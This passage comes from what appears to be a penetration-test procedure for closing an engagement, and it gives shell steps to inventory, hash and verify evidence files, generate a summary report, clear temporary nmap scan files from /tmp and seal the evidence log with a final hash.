**Remediation**: If cleanup fails to remove temporary files, manually verify and remove each artifact. If the evidence report is incomplete, regenerate from the raw evidence logs. If hash verification fails, investigate potential tampering or disk corruption before proceeding.

**Test Steps**:

1. Generate final evidence inventory:
   ```bash
   echo "=== CLEANUP_START $(date -u +%Y-%m-%dT%H:%M:%SZ) ===" | tee -a evidence.log
   find evidence/ -type f | sort > evidence/file_inventory.txt
   echo "Total evidence files: $(wc -l < evidence/file_inventory.txt)" | tee -a evidence.log
   ```

2. Generate comprehensive hash file:
   ```bash
   find evidence/ -type f -not -name "final_hashes_*" \
     -exec sha256sum {} \; | sort -k2 > evidence/final_hashes_<timestamp>.txt
   echo "Hash entries: $(wc -l < evidence/final_hashes_<timestamp>.txt)" | tee -a evidence.log
   ```

3. Verify evidence integrity:
   ```bash
   sha256sum -c evidence/final_hashes_<timestamp>.txt 2>&1 | tee -a evidence.log
   echo "Integrity check: $(grep -c 'OK' evidence.log) files verified" | tee -a evidence.log
   ```

4. Generate engagement summary report:
   ```bash
   cat > evidence/engagement_report_<timestamp>.txt << 'REPORT'
   ENGAGEMENT EVIDENCE REPORT
   ==========================
   Generated: <timestamp>
   Evidence files: <count>
   Evidence hashes: <hash_file>

   Actions logged: <action_count>
   Sessions recorded: <session_count>
   Scope violations: <violation_count>

   Evidence chain status: <verified/failed>
   REPORT
   echo "STATUS: report generated" | tee -a evidence.log
   ```

5. Clean up temporary files (not evidence):
   ```bash
   # Remove temporary scan files, not evidence
   find /tmp -name "*.nmap" -o -name "*.gnmap" -o -name "*.xml" 2>/dev/null | \
     while read f; do rm -f "$f"; echo "CLEANED: $f" | tee -a evidence.log; done
   echo "STATUS: temporary files cleaned" | tee -a evidence.log
   ```

6. Final evidence log closure:
   ```bash
   echo "=== CLEANUP_END $(date -u +%Y-%m-%dT%H:%M:%SZ) ===" | tee -a evidence.log
   echo "ENGAGEMENT_CLOSED: $(date -u +%Y-%m-%dT%H:%M:%SZ)" | tee -a evidence.log
   sha256sum evidence.log | tee -a evidence.log
   ```

**Expected Outcomes**:

| Step | Expected Result | Verification |
|------|-----------------|--------------|
| 1 | Complete file inventory generated | file_inventory.txt lists all evidence |
| 2 | Hash file covers all evidence | Hash count matches file count |
| 3 | Integrity verification passes | All files show OK status |
| 4 | Summary report generated | engagement_report.txt exists |
| 5 | Temporary files removed | /tmp cleared of engagement artifacts |
| 6 | Evidence log closed with hash | Final hash entry present |

**Pass Criteria**:
- [ ] All evidence files inventoried and hashed
- [ ] Integrity verification passes for 100% of evidence files
- [ ] Engagement summary report generated with file counts and status
- [ ] Temporary files cleaned from /tmp (evidence preserved)
- [ ] Evidence log closed with final hash entry
- [ ] No evidence files deleted during cleanup

**Remediation**: Use centralized logging (syslog/ELK) for multi-operator engagements; implement signed evidence chains with GPG for tamper-proof aggregation.

**Post-conditions**:

- Evidence directory intact with all engagement files
- Hash verification confirms no files were modified
- Engagement report available for client delivery
- No temporary artifacts remaining on the testing system
